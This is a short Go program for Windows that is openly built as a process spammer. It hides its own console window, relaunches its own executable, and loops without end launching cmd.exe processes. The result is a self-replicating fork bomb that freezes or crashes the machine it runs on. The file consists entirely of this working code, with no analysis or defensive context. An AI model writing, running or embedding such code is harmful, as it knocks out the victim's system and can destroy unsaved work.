package main

import (
	"os"
	"os/exec"

	"github.com/lxn/win"
)

var this_exe string

func main() {
	this_exe = os.Args[0]
    start_spammer()
}
func start_spammer() {
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	exec.Command(this_exe).Start()
	for {
		(exec.Command("cmd.exe", "pause").Start())
	}
}
